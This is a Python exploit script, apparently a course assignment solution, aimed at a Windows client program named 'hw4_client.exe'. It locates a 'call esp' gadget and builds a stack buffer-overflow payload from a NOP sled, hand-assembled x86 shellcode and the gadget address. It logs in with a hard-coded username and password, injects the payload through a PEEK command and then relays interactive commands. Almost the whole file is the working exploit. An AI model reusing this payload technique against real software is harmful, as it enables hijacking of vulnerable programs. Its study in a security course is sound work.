
import os
import time
import subprocess
from subprocess import PIPE, STDOUT
import sys
from sys import argv
import ctypes
import struct
import utils as gadget_finder
from ctypes import wintypes, windll, POINTER, byref, sizeof, c_char
from ctypes.wintypes import *

from numpy.core import byte



def byte_str_word(input_s,arg_1):
	byte_str = [byte(4)]*(len(input_s)+1)
	j=0
	for i in input_s:
		if j==0:
			byte_str[j] = byte (arg_1)
		elif j >0 and j<4:
			byte_str[j] = byte (0)
		elif j >=4:	
			byte_str[j] = byte(ord(i))
		j += 1
	byte_str[j] = b'\n'	
	return byte_str	

def byte_str_num(input_s,arg_1):
	if arg_1 == 9:
		byte_str = [byte(0)]*(len(input_s)+1)
	else:	
		byte_str = [byte(0)]*(len(input_s)+7)
	j=0
	if arg_1 != 9:
		for j in range (0,6,1):
			if j==0:
				byte_str[j] = byte (arg_1)
			elif j >0 and j<4:
				byte_str[j] = byte (0)
			elif j==4:
				byte_str[j] = byte(ord('.'))	
			elif j==5:
				byte_str[j] = byte(ord(';'))
		j += 1			
	for i in input_s:
		byte_str[j] = byte(ord(i))
		j += 1
	byte_str[j] = b'\n'
	return byte_str	


def byte_exit ():
	exit_str = [byte(0x0)]*5
	exit_str[0] = byte (0x65)
	exit_str[1] = byte (0x78)
	exit_str[2] = byte (0x69)
	exit_str[3] = byte (0x74)
	exit_str[4] = b'\n'
	return exit_str



def get_byt_str(input_s):
	len_str = (len(input_s))
	if len_str > 3:
		op_name = ['A']*4
		for i in range (0,4,1):
			op_name[i] =input_s[i]
		op_str = "".join(op_name)
		arg_1 = 0
		if op_str == 'ECHO':
			 arg_1 = 1
		elif op_str == 'TIME':
			arg_1 = 2
		elif op_str == 'USER':
			arg_1 = 4
		elif op_str =="2020":
			arg_1 = 5
		elif op_str == 'DMSG':
			arg_1 = 6
		elif op_str == 'LOAD':
			arg_1 = 8
		elif op_str == 'PEEK':
			arg_1 = 7
		elif op_str == 'AUTH':
			arg_1 = 3	
		elif op_str == 'exit' and len_str == 4:
			return byte_exit()
		if arg_1 != 0 :
			return 	byte_str_word(input_s,arg_1)
	arg_1 = 7
	return byte_str_num(input_s,arg_1)


gadget = b"\xFF\xD4"
call_esp_addr = ((gadget_finder.GetGadgetAddress(gadget)))
addr_3 = ((byte(call_esp_addr & 0xff)))
addr_2 = (byte(((call_esp_addr) >>8)& 0xff))
addr_1 = (byte(((call_esp_addr) >>16)& 0xff))
addr_0 = (byte(((call_esp_addr) >>24)& 0xff))

stack_code =[
0x89, 0xE5, 0x83, 0xED, 0x04, 0xB8, 0x87, 0x1E, 0x40, 0x00, 0x50, 0xB8, 0x28, 0xFF, 0x60, 0x00, 0x50, 0xB8, 0x00, 0x80, 0x37, 0x00, 0x50, 0xC7, 0x85, 0xE0, 0xFD, 0xFF, 0xFF, 0x65, 0x78, 0x69, 0x74, 0x8B, 0x45, 0x14, 0x89, 0x45, 0x08, 0xC7, 0x45, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x81, 0xEC, 0xA0, 0x20, 0x00, 0x00, 0x89, 0x04, 0x24, 0x89, 0xE0, 0x83, 0xC0, 0x14, 0x68, 0x00, 0x10, 0x00, 0x00, 0x6A, 0x00, 0x50, 0xB8, 0xBC, 0x4B, 0x40, 0x00, 0xFF, 0xD0, 0x58, 0x58, 0x58, 0x89, 0xE0, 0x83, 0xC0, 0x14, 0x50, 0x50, 0xC7, 0x04, 0x24, 0x68, 0x61, 0x40, 0x00, 0xB8, 0x9C, 0x4B, 0x40, 0x00, 0xFF, 0xD0, 0x58, 0x58, 0x89, 0xE0, 0x83, 0xC0, 0x14, 0x50, 0xB8, 0x64, 0x4B, 0x40, 0x00, 0xFF, 0xD0, 0x83, 0xF8, 0x04, 0x5B, 0x75, 0x1E, 0x6A, 0x04, 0x89, 0xE8, 0x2D, 0x20, 0x02, 0x00, 0x00, 0x50, 0x89, 0xE0, 0x83, 0xC0, 0x1C, 0x50, 0xB8, 0x5C, 0x4B, 0x40, 0x00, 0xFF, 0xD0, 0x5B, 0x5B, 0x5B, 0x85, 0xC0, 0x74, 0x28, 0xFF, 0x74, 0x24, 0x10, 0xFF, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x10, 0x83, 0xC0, 0x04, 0x50, 0x52, 0xFF, 0x74, 0x24, 0x10, 0xB8, 0x92, 0x18, 0x40, 0x00, 0xFF, 0xD0, 0x58, 0x58, 0x58, 0x58, 0x58, 0xE9, 0x79, 0xFF, 0xFF, 0xFF, 0xB8, 0x00, 0x00, 0x00, 0x00, 0xBA, 0xD1, 0x1D, 0x40, 0x00, 0xFF, 0xE2, 0x90, 0x90, 0x90, 0x90, 0x90
]
end_stack= [addr_3,addr_2,addr_1,addr_0,0xE9, 0x00, 0xFA, 0xFF, 0xFF]
shellcode = [b'\x00']*0x20A2



# PEEK_C =[
# 0x50,0x45,0x45,0x4b,0x43,
# 0x3a,0x5c,0x55,0x73,0x65,0x72,
# 0x73,0x5c,0x69,0x64,0x61,0x6e,
# 0x52,0x61,0x7a,0x5c,0x52,0x45,
# 0x5f,0x48,0x57,0x5c,0x67,0x65,
# 0x6e,0x65,0x72,0x61,0x74,0x65,
# 0x64,0x5c,0x73,0x65,0x72,0x76,
# 0x65,0x72,0x5c,0x33,0x31,0x32,
# 0x31,0x37,0x39,0x36,0x37,0x34,
# 0x2d,0x32,0x30,0x34,0x35,0x31,
# 0x32,0x34,0x35,0x33
# ]

# 0x50,0x45,0x45,0x4b,0x20,0x43,
# 0x3a,0x5c,0x55,0x73,0x65,0x72,
# 0x73,0x5c,0x69,0x64,0x61,0x6e,
# 0x52,0x61,0x7a,0x5c,0x52,0x45,
# 0x5f,0x48,0x57,0x5c,0x67,0x65,
# 0x6e,0x65,0x72,0x61,0x74,0x65,
# 0x64,0x5c,0x73,0x65,0x72,0x76,
# 0x65,0x72,0x5c,0x33,0x31,0x32,
# 0x31,0x37,0x39,0x36,0x37,0x34,
# 0x2d,0x32,0x30,0x34,0x35,0x31,
# 0x32,0x34,0x35,0x33



for i in range (0x1000,0x20A2,1):
	shellcode[i] = byte(0x90)


i =0x0
for j in stack_code:
	shellcode[0x1f00+i] = byte(j)
	i +=0x1

i =0x0
for j in end_stack:
	shellcode[0x2098+i] = byte(j)
	i +=0x1

shellcode[0x2098+i]=b'\n'







archer = "archer"
archer_p = "S43U0SE6NZ4S46S5"
PEEK = "PEEK"



ris = subprocess.Popen('hw4_client.exe',stdin=subprocess.PIPE )

input_t = byte_str_num(archer,9)
for  j in input_t:
	ris.stdin.write(j)
	ris.stdin.flush()
	
input_t = byte_str_num(archer_p,9)
for  j in input_t:
	ris.stdin.write(j)
	ris.stdin.flush()


input_t = byte_str_num(PEEK,9)
for j in input_t:
	ris.stdin.write(j)
	ris.stdin.flush()


for j in shellcode:
	ris.stdin.write(j)
	ris.stdin.flush()






input_s = 'A' 

while input_s != "exit":
	input_s = input()
	input_t = get_byt_str(input_s)
	
	for j in input_t:
		ris.stdin.write(j)	
		#ris.stdin.flush()


ris.wait()

